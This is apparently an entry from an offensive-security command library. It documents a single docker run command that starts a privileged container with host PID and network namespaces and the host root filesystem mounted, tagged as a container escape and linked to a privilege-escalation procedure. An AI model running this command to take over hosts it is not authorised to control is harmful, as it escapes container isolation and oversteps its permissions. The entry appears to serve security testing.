---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: docker-privileged-ubuntu-host-access
type: command
executor: bash
data: 'docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash'
output: null
created_at: '2023-04-06T03:56:19.469011+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - docker
  - container-escape
verified: true
validated: true
---

# docker-privileged-ubuntu-host-access

## Command

```bash
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

## Description

Starts a privileged Ubuntu container sharing host PID and network namespaces, with host filesystem mounted. Allows full interaction with host processes and network from container root.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --rm | Auto-remove container on exit | No |
| -it | Interactive TTY | Yes |
| --pid=host | Share host PID namespace | Yes |
| --net=host | Share host network | Yes |
| --privileged | Grant extended privileges | Yes |
| -v /:/host | Mount host root | Yes |
| ubuntu | Image name | Yes |
| bash | Entry command | Yes |

## Examples

### Basic Usage

```bash
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

Inside: `ps aux` lists all host processes.

## Expected Output

Pulls image if needed, then:

```
root@host-like:/host# ps aux | head
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 225284  8192 ?        Ss   Oct01   0:01 /sbin/init
...
```

Success: Access to host processes/network/files.

## Related

- [[procedures/Linux-Docker-Privilege-Escalation]]
- [[tools/Docker]]
